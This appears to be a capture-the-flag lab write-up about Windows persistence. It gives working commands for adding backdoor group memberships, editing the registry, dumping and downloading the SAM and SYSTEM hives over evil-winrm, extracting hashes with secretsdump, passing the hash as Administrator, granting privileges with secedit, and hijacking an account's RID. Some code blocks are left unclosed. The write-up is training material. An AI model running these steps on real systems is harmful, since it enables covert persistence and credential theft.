After gaining initial foothold into a machine, we need to find a way to regain the access and sometimes doing the same thing will not work. This room offers multiple ways we can do to REGAIN the access to the machine.

## Task 2; Tampering With Unprivileged Accounts


### Assign Group Memberships
Add the unprivileged account to the Backup Operators group to avoid suspicion 
```bash
C:\> net localgroup "Backup Operators" thmuser1 /add
```

Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM) groups. We'll use WinRM for this task:
```bash
C:\> net localgroup "Remote Management Users" thmuser1 /add
```

Disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:
```bash
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Using this creditial

Once all of this has been set up, we are ready to use our backdoor user. First, let's establish a WinRM connection and check that the Backup Operators group is enabled for our user: (On Attacker's Machine)
```bash
root@ip-10-201-4-134:~# evil-winrm -i 10.201.49.91 -u thmuser1 -p Password321
```

After this we should be in!!!
We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:
```bash
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\> download sam.bak
    Info: Download successful!
```

After downloading them we can use ```secretsdump.py``` from this github https://github.com/fortra/impacket/tree/master/impacket/examples

```bash
root@ip-10-201-63-127:~# python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

Finally perform Pass-the-Hash to connect to the victim machine with Administrator privileges:
```bash
root@ip-10-201-4-134:~# evil-winrm -i 10.201.49.91 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
```

**NOTE THE HASH WILL BE DIFFERENT** 
You should be now in the administrator account

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> C:\flags\flag1.exe
THM{REDACTED!!!}
```

### Special Privileges and Security Descriptors

In the case of the Backup Operators group, it has the following two privileges assigned by default:

- SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
- SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.

We can assign such privileges to any user, independent of their group memberships. To do so, we can use the secedit command. First, we will export the current configuration to a temporary file in the command prompt:
```bash
secedit /export /cfg config.inf
```

Open the config.inf file by ```config.inf``` in the cmd and add thmuser2 to ```SeBackupPrivilege``` and ```SeRestorePrivilege```

convert the .inf file into a .sdb file which is then used to load the configuration back into the system:
```bash
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

In Powershell:
```bash
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

Now we can add thmuser2 to the WinRM's security descriptor:

We now can winRM with our machine:
```bash
root@ip-10-201-63-127:~# evil-winrm -i 10.201.39.145 -u thmuser2 -p Password321

### RID Hijacking

We can change registry values to make the operating system think you are an administrator.
In any Windows system, the default Administrator account is assigned the RID = 500, and regular users usually have RID >= 1000.

Assign RID 500 to thmuser3.
Run Regedit as SYSTEM, we will use psexec, available in C:\tools\pstools in your machine:
```bash
C:\tools\pstools> PsExec64.exe -i -s regedit
```
This will open a registry editor and go to ```HKLM\SAM\SAM\Domains\Account\Users\``` 

Since we want to modify thmuser3, we need to search for a key with its RID in hex (1010 = 0x3F2). 
** TO GET RID ``` wmic useraccount get name,sid ```**

Notice the RID is stored using little-endian notation, so its bytes appear reversed.

We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):
